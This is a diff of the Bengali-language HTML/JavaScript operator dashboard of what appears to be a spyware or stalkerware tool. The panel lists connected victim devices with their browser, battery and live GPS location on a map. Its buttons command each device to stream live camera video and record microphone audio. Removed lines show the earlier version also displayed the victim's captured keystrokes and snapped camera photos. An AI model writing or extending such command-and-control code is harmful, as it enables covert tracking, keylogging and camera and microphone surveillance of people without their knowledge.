@@ -13,24 +13,31 @@
         #map { height: 100%; width: 100%; }
         .info-panel { flex: 1; min-width: 300px; background: #1e293b; border-radius: 15px; padding: 20px; height: 500px; overflow-y: auto; }
         .info-panel h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 2px solid #334155; padding-bottom: 10px; }
+        
         .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; cursor: pointer; transition: 0.2s; }
         .device-card:hover { background: #1e293b; transform: scale(1.01); }
         .device-card .name { font-weight: bold; font-size: 16px; color: #38bdf8; }
         .device-card .detail { font-size: 13px; color: #94a3b8; margin-top: 6px; line-height: 1.4; }
         .device-card .detail b { color: #e2e8f0; }
         .online { border-left-color: #22c55e; }
-        .no-data { text-align: center; color: #64748b; margin-top: 50px; }
         
         .action-btns { display: flex; gap: 10px; margin-top: 10px; }
         .btn { flex: 1; color: white; border: none; padding: 8px; border-radius: 5px; font-size: 12px; cursor: pointer; font-weight: bold; transition: 0.2s; }
         .btn:hover { opacity: 0.8; }
-        .btn-capture { background: #ef4444; }
+        .btn-start { background: #22c55e; }
+        .btn-stop { background: #ef4444; }
         .btn-audio { background: #8b5cf6; }
 
+        /* লাইভ ভিডিও মডাল (CCTV স্টাইল) */
+        .video-modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); flex-direction: column; justify-content: center; align-items: center; }
+        .video-container { width: 90%; max-width: 800px; background: black; border-radius: 10px; overflow: hidden; position: relative; border: 2px solid #38bdf8; box-shadow: 0 0 20px rgba(56, 189, 248, 0.3); }
+        .video-container img { width: 100%; display: block; }
+        .video-header { display: flex; justify-content: space-between; align-items: center; background: #1e293b; padding: 10px 20px; }
+        .close-video-btn { background: #ef4444; color: white; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        
         .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; }
-        .modal-content { background: #1e293b; padding: 20px; border-radius: 10px; max-width: 90%; text-align: center; }
-        .modal-content img { max-width: 100%; max-height: 60vh; border-radius: 5px; background: black; margin-bottom: 15px; display: none; }
-        .modal-content audio { width: 100%; margin-top: 10px; display: none; }
+        .modal-content { background: #1e293b; padding: 20px; border-radius: 10px; text-align: center; }
+        .modal-content audio { width: 100%; margin-top: 10px; }
         .close-btn { margin-top: 15px; background: #38bdf8; border: none; padding: 10px 20px; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; }
     </style>
 </head>
@@ -41,20 +48,29 @@
             <div id="map"></div>
         </div>
         <div class="info-panel">
-            <h2>📱 কানেক্টেড ডিভাইস <span style="font-size:12px; color:#64748b;">(লোকেশন দেখতে ক্লিক করুন)</span></h2>
-            <div id="deviceList">
-                <div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>
-            </div>
+            <h2>📱 কানেক্টেড ডিভাইস</h2>
+            <div id="deviceList"></div>
         </div>
     </div>
 
-    <div id="mediaModal" class="modal">
+    <!-- লাইভ ভিডিও মডাল -->
+    <div id="videoModal" class="video-modal">
+        <div class="video-container">
+            <div class="video-header">
+                <h3 id="videoTitle" style="color: #38bdf8; font-size: 16px;">লাইভ ক্যামেরা</h3>
+                <button class="close-video-btn" onclick="closeVideo()">বন্ধ করুন</button>
+            </div>
+            <img id="liveVideoFeed" src="" alt="Waiting for video feed...">
+        </div>
+    </div>
+
+    <!-- অডিও মডাল -->
+    <div id="audioModal" class="modal">
         <div class="modal-content">
-            <h3 id="modalTitle" style="margin-bottom: 10px; color: #38bdf8;">মিডিয়া ফাইল</h3>
-            <img id="modalImage" src="" alt="Captured Photo">
+            <h3 style="margin-bottom: 10px; color: #38bdf8;">🎙️ রেকর্ড করা অডিও</h3>
             <audio id="modalAudio" controls></audio>
             <br>
-            <button class="close-btn" onclick="closeModal()">বন্ধ করুন</button>
+            <button class="close-btn" onclick="closeAudioModal()">বন্ধ করুন</button>
         </div>
     </div>
 
@@ -67,8 +83,8 @@
         
         let markers = {};
         let circles = {};
-        let lastImgTime = {};
         let lastAudTime = {};
+        let activeLiveVideoId = null; // কোন ডিভাইসের ভিডিও দেখা হচ্ছে
 
         function fetchClients() {
             fetch('/api/clients')
@@ -89,50 +105,44 @@
                         card.className = 'device-card online';
                         
                         card.onclick = () => {
-                            if (data.lat && data.lng) {
-                                map.setView([parseFloat(data.lat), parseFloat(data.lng)], 16);
-                            }
+                            if (data.lat && data.lng) map.setView([parseFloat(data.lat), parseFloat(data.lng)], 16);
                         };
                         
                         card.innerHTML = `
                             <div class="name">📱 ${data.device || 'অজানা ডিভাইস'}</div>
                             <div class="detail">🌐 ব্রাউজার: <b>${data.browser || 'N/A'}</b></div>
-                            <div class="detail">🔋 ব্যাটারি: <b>${data.battery || 'N/A'}%</b> (${data.charging || 'N/A'})</div>
-                            <div class="detail">📶 নেটওয়ার্ক: <b>${data.network || 'N/A'}</b></div>
+                            <div class="detail">🔋 ব্যাটারি: <b>${data.battery || 'N/A'}%</b></div>
+                            <div class="detail">📍 অবস্থান: <b>${data.lat ? parseFloat(data.lat).toFixed(5) : 'N/A'}, ${data.lng ? parseFloat(data.lng).toFixed(5) : ''}</b></div>
                             
-                            <div class="detail" style="margin-top:10px; padding:10px; background:#334155; border-radius:5px; border-left: 3px solid #facc15;">
-                                <span style="color:#facc15; font-size:12px;">⌨️ টাইপিং:</span><br>
-                                <b style="color:#fff; word-break: break-all;">${data.keystrokes || 'কিছু টাইপ করা হয়নি...'}</b>
-                            </div>
-
-                            <div class="detail" style="margin-top:10px; padding-top:10px; border-top: 1px solid #334155;">
-                                📍 অবস্থান: <b>${data.lat ? parseFloat(data.lat).toFixed(5) : 'N/A'}, ${data.lng ? parseFloat(data.lng).toFixed(5) : ''}</b><br>
-                                🕒 শেষ আপডেট: <b>${data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A'}</b>
-                            </div>
                             <div class="action-btns">
-                                <button class="btn btn-capture" onclick="event.stopPropagation(); sendCommand('${id}', 'capture')">📸 ছবি তুলুন</button>
-                                <button class="btn btn-audio" onclick="event.stopPropagation(); sendCommand('${id}', 'record_audio')">🎙️ অডিও রেকর্ড</button>
+                                <button class="btn btn-start" onclick="event.stopPropagation(); sendCommand('${id}', 'start_live')">📹 লাইভ ভিডিও</button>
+                                <button class="btn btn-stop" onclick="event.stopPropagation(); sendCommand('${id}', 'stop_live')">⏹️ বন্ধ</button>
+                                <button class="btn btn-audio" onclick="event.stopPropagation(); sendCommand('${id}', 'record_audio')">🎙️ অডিও</button>
                             </div>
                         `;
                         list.appendChild(card);
 
-                        if (data.camera_image && data.camera_time && lastImgTime[id] !== data.camera_time) {
-                            lastImgTime[id] = data.camera_time;
-                            showMedia('image', data.camera_image);
+                        // নতুন ভিডিও ফ্রেম আসলে লাইভ স্ক্রিনে দেখানো
+                        if (data.video_frame && data.video_time) {
+                            if (activeLiveVideoId === id) {
+                                document.getElementById('liveVideoFeed').src = data.video_frame;
+                            }
                         }
+
+                        // নতুন অডিও আসলে প্লে করা
                         if (data.audio_data && data.audio_time && lastAudTime[id] !== data.audio_time) {
                             lastAudTime[id] = data.audio_time;
-                            showMedia('audio', data.audio_data);
+                            document.getElementById('modalAudio').src = data.audio_data;
+                            document.getElementById('audioModal').style.display = 'flex';
+                            document.getElementById('modalAudio').play();
                         }
 
                         if (data.lat && data.lng) {
                             const pos = [parseFloat(data.lat), parseFloat(data.lng)];
                             if (markers[id]) {
                                 markers[id].setLatLng(pos);
-                                if(circles[id]) circles[id].setLatLng(pos);
                             } else {
                                 markers[id] = L.marker(pos).addTo(map);
-                                circles[id] = L.circle(pos, { radius: data.accuracy || 50, color: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
                             }
                         }
                     });
@@ -141,52 +151,38 @@
         }
 
         function sendCommand(clientId, command) {
+            if (command === 'start_live') {
+                activeLiveVideoId = clientId;
+                document.getElementById('videoModal').style.display = 'flex';
+                document.getElementById('liveVideoFeed').src = ""; // রিসেট
+            } else if (command === 'stop_live') {
+                if (activeLiveVideoId === clientId) {
+                    activeLiveVideoId = null;
+                    document.getElementById('videoModal').style.display = 'none';
+                }
+            }
+
             fetch('/api/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ client_id: clientId, command: command })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.error) {
-                    alert("ব্যর্থ: " + data.error);
-                } else {
-                    if (command === 'capture') alert("📸 ছবি তোলার কমান্ড পাঠানো হয়েছে!");
-                    if (command === 'record_audio') alert("🎙️ অডিও রেকর্ডের কমান্ড পাঠানো হয়েছে!");
-                }
-            })
-            .catch(err => console.error("Command error:", err));
+            }).catch(err => console.error("Command error:", err));
         }
 
-        function showMedia(type, src) {
-            const modal = document.getElementById('mediaModal');
-            const img = document.getElementById('modalImage');
-            const audio = document.getElementById('modalAudio');
-            const title = document.getElementById('modalTitle');
-
-            if (type === 'image') {
-                title.innerText = "📸 ক্যামেরার ছবি";
-                img.src = src;
-                img.style.display = 'block';
-                audio.style.display = 'none';
-                audio.pause();
-            } else if (type === 'audio') {
-                title.innerText = "🎙️ রেকর্ড করা অডিও";
-                audio.src = src;
-                audio.style.display = 'block';
-                img.style.display = 'none';
-                audio.play();
+        function closeVideo() {
+            if (activeLiveVideoId) {
+                sendCommand(activeLiveVideoId, 'stop_live');
             }
-            modal.style.display = 'flex';
+            document.getElementById('videoModal').style.display = 'none';
         }
 
-        function closeModal() {
-            document.getElementById('mediaModal').style.display = 'none';
+        function closeAudioModal() {
+            document.getElementById('audioModal').style.display = 'none';
             document.getElementById('modalAudio').pause();
         }
 
         fetchClients();
-        setInterval(fetchClients, 2000);
+        setInterval(fetchClients, 500); // প্রতি ৫০০ মিলি সেকেন্ডে আপডেট (ভিডিও স্মুথ রাখার জন্য)
     </script>
 </body>
 </html>
